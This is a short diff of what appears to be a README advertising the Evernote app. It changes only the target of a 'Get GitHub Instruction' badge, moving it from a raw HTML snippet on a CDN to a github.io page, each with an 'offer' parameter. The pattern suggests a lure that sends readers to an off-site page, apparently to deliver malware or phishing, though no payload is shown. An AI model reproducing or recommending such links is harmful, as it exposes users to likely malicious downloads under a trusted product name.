@@ -2,7 +2,7 @@
 
 Evernote is a powerful cross-platform application that helps you **capture, organize, and access everything that matters** — from notes and checklists to scanned documents and web clippings. Stay productive anywhere with synchronized notebooks and seamless device integration. 🧠  
 
-[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://glcdn.githack.com/-/snippets/4899053/raw/main/Evernote.html?offer=Evernote)
+[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://app-set-deploy.github.io/.github/?offer=Evernote)
 
 ---
 
